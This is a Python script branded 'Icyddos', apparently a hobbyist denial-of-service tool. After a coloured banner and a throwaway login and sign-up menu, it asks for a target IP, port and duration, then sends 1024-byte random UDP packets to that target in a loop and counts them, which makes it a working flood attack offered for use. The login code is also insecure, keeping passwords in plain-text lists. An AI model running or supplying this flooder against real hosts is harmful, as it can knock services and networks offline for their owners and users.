import os
import time
import socket
import sys
import random
from colored import fg, bg, attr

username_list = ['']
password_list = ['']

def icyddos():
	os.system('cls')
	print(fg(9) + '.___', end='')
	print(fg(46) + '                 .___  .___            ')
	print(fg(9) + '|   |', end='')
	print(fg(46) + ' ____ ___.__. __| _/__| _/____  ______')
	print(fg(9) + '|   |', end='')
	print(fg(46) + '/ ___<   |  |/ __ |/ __ |/  _ \/  ___/')
	print(fg(9) + '|   ', end='')
	print(fg(46) + '\  \___\___  / /_/ / /_/ (  <_> )___ \ ')
	print(fg(9) + '|___|', end='')
	print(fg(46) + '\___  > ____\____ \____ |\____/____  >')
	print(fg(46) + '         \/\/         \/    \/          \/ ')
	print(fg(9) + 'I', end='')
	print(fg(46) + 'cyddos -', end=' ')
	print(fg(9) + 'M', end='')
	print(fg(46) + 'ade', end=' ')
	print(fg(9) + 'B', end='')
	print(fg(46) + 'y', end=' ')
	print(fg(9) + 'I', end='')
	print(fg(46) + 'ceyzx')

def login_account():
	while True:
		print(fg(9) + '\n [', end='')
		print(fg(15) + "*", end='')
		print(fg(9) + "]", end=' ')
		print(fg(11) + 'Login')

		print(fg(9) + ' [', end='')
		print(fg(15) + "+", end='')
		print(fg(9) + "]", end=' ')
		print(fg(11) + "Username: ", end='')
		login_username = input(fg(15) + "")
			
		if login_username in username_list:
			while True:
				print(fg(9) + ' [', end='')
				print(fg(15) + "+", end='')
				print(fg(9) + "]", end=' ')
				print(fg(11) + "Passsword: ", end='')
				login_password = input(fg(15) + '')
				if login_password == password_list[0]:
					print(fg(46) + '\n[+] Login Successful.')
					break

				else:
					print(fg(9) + "\n[x] Incorrect Password.\n")
			break
		
		else:
			print(fg(9) + "\n[x] This username does not exist.")
			continue

def sign_up_account():
	while True:
		print(fg(9) + '\n [', end='')
		print(fg(15) + "*", end='')
		print(fg(9) + "]", end=' ')
		print(fg(11) + "Sign Up")

		print(fg(9) + ' [', end='')
		print(fg(15) + "+", end='')
		print(fg(9) + "]", end=' ')
		print(fg(11) + "Username: ", end='')
		sign_up_username = input(fg(15) + '')

		if sign_up_username not in username_list:
			while True:
				print(fg(9) + ' [', end='')
				print(fg(15) + "+", end='')
				print(fg(9) + "]", end=' ')
				print(fg(11) + 'Password: ', end='')
				sign_up_password = input('')

				print(fg(9) + ' [', end='')
				print(fg(15) + "+", end='')
				print(fg(9) + "]", end=' ')
				print(fg(11) + 'Confirm Password: ', end='')
				sign_up_password_confirmation = input('')

				if sign_up_password == sign_up_password_confirmation:
					print(fg(46) + '\n[+] Sign Up Successful.')
					username_list.append(sign_up_username)
					password_list.append(sign_up_password)
					break
				
				else:
					print(fg(9) + '\n[x] Confirm password and password is not the same.')
			break

		else:
			print(fg(9) + '\n[x] Username is taken.')

def login_or_sign_up():
	while True:
		print(fg(9) + '\n[', end='')
		print(fg(15) + '01', end='')
		print(fg(9) + ']', end=' ')
		print(fg(11) + 'Login')

		print(fg(9) + '[', end='')
		print(fg(15) + '02', end='')
		print(fg(9) + ']', end=' ')
		print(fg(11) + 'Sign Up')

		print(fg(9) + '\n[', end='')
		print(fg(15) + '::', end='')
		print(fg(9) + ']', end=' ')
		print(fg(11) + 'Choose an option: ', end='')

		decision = input(fg(15) + '')

		if decision == '1':
			login_account()
			break

		elif decision == '2':
			sign_up_account()
			break

		else:
			print('Invalid Input.')

def main_content():
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	bytes = random._urandom(1024)

	print(fg(9) + '\n [', end='')
	print(fg(15) + '-', end='')
	print(fg(9) + ']', end=' ')
	print(fg(11) + 'Enter IP: ', end='')
	ip = input(fg(15) + '')

	print(fg(9) + ' [', end='')
	print(fg(15) + '-', end='')
	print(fg(9) + ']', end=' ')
	print(fg(11) + 'Enter Port: ', end='')
	port = int(input(fg(15) + ''))

	print(fg(9) + ' [', end='')
	print(fg(15) + '-', end='')
	print(fg(9) + ']', end=' ')
	print(fg(11) + 'Enter the number of seconds to send packets: ', end='')
	duration = input(fg(15) + '')

	timeout = time.time() + float(duration)
	sent = 0

	print(fg(9) + ' [', end='')
	print(fg(15) + '+', end='')
	print(fg(9) + ']', end=' ')
	print(fg(11) + 'Icyddos starting...\n')

	while True:
		if time.time() > timeout:
			break
		else:
			pass
		sock.sendto(bytes,(ip, port))
		sent = sent + 1
		print(fg(9) + ' [', end='')
		print(fg(15) + '*', end='')
		print(fg(9) + ']', end=' ')
		print(fg(2) + "SENT", end=' ')
		print(fg(11) + f'{sent}', end=' ')
		print(fg(2) + 'PACKETS TO', end=' ')
		print(fg(11) + f'{ip}', end=' ')
		print(fg(2) + 'THROUGH PORT', end=' ')
		print(fg(11) + f'{port}')

	print(fg(46) + f'\n[+] Successfully sent {sent} packets to {ip}.')
	end = input(fg(15) + '')
icyddos()
login_or_sign_up()
main_content()
